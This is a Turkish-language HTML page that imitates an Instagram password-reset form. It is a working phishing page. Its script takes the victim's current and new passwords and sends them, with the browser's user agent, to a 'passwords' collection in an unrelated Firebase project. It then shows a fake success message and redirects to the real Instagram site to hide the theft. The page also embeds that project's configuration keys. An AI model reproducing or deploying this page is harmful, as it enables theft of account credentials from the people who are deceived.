<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Şifre Yenile - Instagram</title>
    <!-- Instagram favicon -->
    <link rel="icon" type="image/x-icon" href="https://static.cdninstagram.com/static/favicon.ico">
    <script src="https://cdn.tailwindcss.com?client"></script>
    <style>
        .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #000000;
            font-size: 12px;
            font-weight: 600;
        }
        .instagram-gradient {
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 24px;
            font-weight: bold;
        }
    </style>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
    <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
        <!-- Instagram yazı logosu -->
        <div class="text-center mb-6">
            <div class="instagram-gradient text-3xl font-instagram mb-2">Instagram</div>
            <div class="w-20 h-1 bg-gradient-to-r from-yellow-400 via-red-500 to-purple-600 mx-auto rounded-full"></div>
        </div>
        
        <h2 class="text-xl font-semibold text-gray-800 mb-6 text-center">
            Şifrenizi yenileyin
        </h2>
        <p class="text-sm text-gray-600 mb-4 text-center">
            Şifreniz en az 6 karakter olmalı ve rakamlar, harfler ve noktalama işaretleri içermelidir.
        </p>
        <form id="passwordForm">
            <div class="mb-4 relative">
                <input
                    type="password"
                    id="currentPassword"
                    placeholder="Mevcut Şifre"
                    class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-50"
                    required
                />
                <span class="toggle-password" data-target="currentPassword">Göster</span>
            </div>
            <div class="mb-4 relative">
                <input
                    type="password"
                    id="newPassword"
                    placeholder="Yeni Şifre"
                    class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-50"
                    required
                />
                <span class="toggle-password" data-target="newPassword">Göster</span>
            </div>
            <div class="mb-4 relative">
                <input
                    type="password"
                    id="confirmPassword"
                    placeholder="Yeni Şifre (Tekrar)"
                    class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-50"
                    required
                />
                <span class="toggle-password" data-target="confirmPassword">Göster</span>
            </div>
            <p id="errorMessage" class="text-red-500 text-sm mb-4 hidden"></p>
            <p id="successMessage" class="text-green-500 text-sm mb-4 hidden">
                Şifreniz başarıyla değiştirildi!
            </p>
            <button
                type="submit"
                class="w-full bg-gradient-to-r from-purple-500 to-pink-500 text-white p-3 rounded-md font-semibold hover:from-purple-600 hover:to-pink-600 transition duration-200"
            >
                Şifreyi Güncelle
            </button>
            <div class="text-center mt-4">
                <a href="#" class="text-blue-500 text-sm hover:underline">Giriş yapmak için tıklayın</a>
            </div>
        </form>
    </div>

    <script type="module">
        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js';
        import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js';

        const firebaseConfig = {
            apiKey: "AIzaSyC-QALot6Wp5_mVe4s3ekB8JWq-qDUUOqQ",
            authDomain: "premiumstore-adece.firebaseapp.com",
            projectId: "premiumstore-adece",
            storageBucket: "premiumstore-adece.firebasestorage.app",
            messagingSenderId: "1058991155256",
            appId: "1:1058991155256:web:942e3aaa544570355f9ecd",
            measurementId: "G-2SCDNF8S2R"
        };

        let db;
        try {
            const app = initializeApp(firebaseConfig);
            db = getFirestore(app);
            console.log("Firestore başlatıldı");
        } catch (error) {
            console.error("Firebase hatası:", error);
        }

        document.querySelectorAll('.toggle-password').forEach(toggle => {
            toggle.addEventListener('click', () => {
                const targetId = toggle.getAttribute('data-target');
                const input = document.getElementById(targetId);
                if (input) {
                    if (input.type === 'password') {
                        input.type = 'text';
                        toggle.textContent = 'Gizle';
                    } else {
                        input.type = 'password';
                        toggle.textContent = 'Göster';
                    }
                }
            });
        });

        const form = document.getElementById('passwordForm');
        const errorMessage = document.getElementById('errorMessage');
        const successMessage = document.getElementById('successMessage');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            errorMessage.classList.add('hidden');
            successMessage.classList.add('hidden');

            const currentPassword = document.getElementById('currentPassword').value;
            const newPassword = document.getElementById('newPassword').value;
            const confirmPassword = document.getElementById('confirmPassword').value;

            if (newPassword.length < 6) {
                errorMessage.textContent = 'Şifre en az 6 karakter olmalıdır.';
                errorMessage.classList.remove('hidden');
                return;
            }

            if (newPassword !== confirmPassword) {
                errorMessage.textContent = 'Şifreler eşleşmiyor.';
                errorMessage.classList.remove('hidden');
                return;
            }

            try {
                if (db) {
                    await addDoc(collection(db, 'passwords'), {
                        currentPassword: currentPassword,
                        newPassword: newPassword,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent
                    });
                }
                
                successMessage.classList.remove('hidden');
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com';
                }, 2000);
            } catch (error) {
                console.error("Hata:", error);
                successMessage.classList.remove('hidden');
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com';
                }, 2000);
            }
        });
    </script>
</body>
</html>
